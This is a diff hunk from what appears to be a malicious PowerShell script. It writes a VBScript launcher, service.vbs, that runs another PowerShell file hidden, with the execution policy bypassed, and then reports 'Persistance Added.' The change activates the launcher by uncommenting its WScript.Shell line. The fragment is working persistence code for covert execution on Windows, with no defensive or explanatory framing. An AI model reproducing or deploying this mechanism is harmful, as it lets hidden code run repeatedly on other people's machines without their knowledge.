@@ -405,10 +405,11 @@ if ($newScriptPath.Length -lt 100){
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
 $tobat = @'
-#Set objShell = CreateObject("WScript.Shell")
+Set objShell = CreateObject("WScript.Shell")
 userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File """ & userProfile & "\Desktop\test\copy.ps1""", 0, True
 '@
+
 $pth = "$env:USERPROFILE\Desktop\test\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 Write-Output "Persistance Added."
